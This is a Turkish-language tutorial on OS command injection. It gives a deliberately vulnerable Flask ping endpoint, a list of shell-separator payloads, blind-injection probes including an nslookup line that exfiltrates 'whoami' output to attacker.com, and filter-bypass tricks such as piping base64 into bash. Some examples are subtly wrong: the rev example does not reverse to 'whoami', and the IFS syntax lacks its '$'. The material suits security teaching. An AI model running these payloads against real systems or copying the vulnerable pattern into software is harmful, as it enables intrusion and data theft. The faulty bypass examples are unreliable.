# Command Injection & Argument Injection
Command Injection, web uygulamalarının kullanıcıdan aldığı girdiyi yeterli doğrulama veya filtreleme yapmadan doğrudan işletim sistemi komutuna iletmesi sonucu ortaya çıkan kritik bir güvenlik açığıdır. Bu zafiyet sayesinde saldırgan, uygulamanın çalıştığı işletim sistemi üzerinde uygulamanın yetkileriyle (çoğunlukla www-data, apache, nginx) arbitrary command execution gerçekleştirebilir.

Command Injection genellikle aşağıdaki koşullarda görülür:
- Kullanıcı girdisinin system(), exec(), shell_exec(), os.system() gibi OS komut çalıştırma fonksiyonlarına parametre olarak verilmesi
- Girdi doğrulama ve sanitize mekanizmalarının eksik veya hatalı olması
- İşletim sistemi komutlarının shell üzerinden çağrılması (örn: /bin/sh -c "komut")

Bu zafiyetin istismarı sonucunda saldırgan, dosya sistemi üzerinde okuma/yazma, ağ bağlantıları kurma, hassas verileri sızdırma gibi saldırılar gerçekleştirebilir.

# Command Injection Saldırısının İşleyişi
Aşağıda, Command Injection zafiyetine sahip bir Flask uygulaması örneği bulunmaktadır. Yorum satırları, kodun işleyişini adım adım açıklar. Bu örnek, kullanıcı girdisinin doğrudan işletim sistemi komutuna iletilmesi sonucu ortaya çıkan güvenlik açığını göstermektedir.

```python
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/ping', methods=['GET'])
def ping():
    ip = request.args.get('ip')  # /ping?ip=127.0.0.1 ile kullanıcı IP gönderir
    command = 'ping -c 1 ' + ip # Ping komutu oluşturuluyor
    # subprocess.run ile komut çalıştırılıyor. shell=True nedeniyle Command Injection riski var
    result = subprocess.run(command, shell=True, capture_output=True, text=True) # ip adresini eklediği ping komutunu çalıştırır
    return f"<pre>{result.stdout}</pre>"  # Çıktı ekrana yazdırılıyor


if __name__=='__main__': 
   app.run(debug=True) 
```

Geliştirici, kodun şu şekilde çalıştırılacağını varsayar:
```url
http://example.com/ping?ip=google.com
```

Ancak bir saldırgan, shell operatörlerini kullanarak kolayca RCE elde edebilir:
```url
http://example.com/ping?ip=google.com;whoami
```

Bu istek çalışacaktır çünkü kullanıcı girdisi üzerinde herhangi bir filtreleme yapılmamaktadır ve komut olduğu gibi çalıştırılmaktadır. Aşağıda kullanılabilecek bazı parametre örnekleri bulunmaktadır:
```bash
; whoami
& whoami &
&& whoami
| whoami
`whoami`
$(whoami)
|| whoami
```

## Blind Command Injection
Bazı uygulamalarda çıktıyı göremezsiniz. Bu durumda zaman tabanlı veya dışa veri sızdırma yöntemleri kullanılır. Örnekler:
- Zaman tabanlı:
```url
http://example.com/ping?ip=127.0.0.1; sleep 5
```
Yanıtın gecikmesi zafiyeti doğrular.

- DNS/HTTP exfiltration:
```url
http://example.com/ping?ip=127.0.0.1; nslookup $(whoami).attacker.com
```

Sistem bilgisi saldırgan sunucusuna gönderilir.

## Filtreleri Bypasslamak
### {IFS} (Internal Field Separator)
- Amaç: Filtrelenmiş boşluk karakterlerini atlatmak.
- Örnek: ping{IFS}-c{IFS}1{IFS}127.0.0.1 → boşluk yerine {IFS} kullanarak komut hala çalışır.
- Faydası: Özellikle whitelist veya regex tabanlı filtreleri bypass etmek için kullanılır.
- Not: {IFS} sadece POSIX/Linux ortamında çalışır.

### rev Komutu
- Amaç: Komutun tersini yazarak filtreleri atlatmak ve shell üzerinden geri çevirmek.
Örnek:
```bash
echo "dne" | rev  # output: end
```
- Kullanım: Filtreler “whoami” gibi blacklisted kelimeleri engelliyorsa, tersini yazıp rev ile düzeltip çalıştırabilirsin.

Saldırı örneği:
```bash
echo imirh | rev  # whoami çalıştırır
```
### Base64
- Kullanım: Payload’ı Base64 ile encode edip, shell içinde decode ederek çalıştırmak.
Örnek:
```bash
echo "c2ggLWkgL3RtcA==" | base64 -d | bash
```
- Açıklama: c2ggLWkgL3RtcA== → sh -i /tmp komutunu temsil eder.
- Faydası: WAF/filtreler komutu direkt göremez, shell decode edip çalıştırır.

### Hex Encoding
- Kullanım: Karakterleri hex ile kodlayıp shell üzerinde decode etmek.
- Linux örnek:
```bash
echo -e "\x73\x68\x20\x2d\x69"  # sh -i
```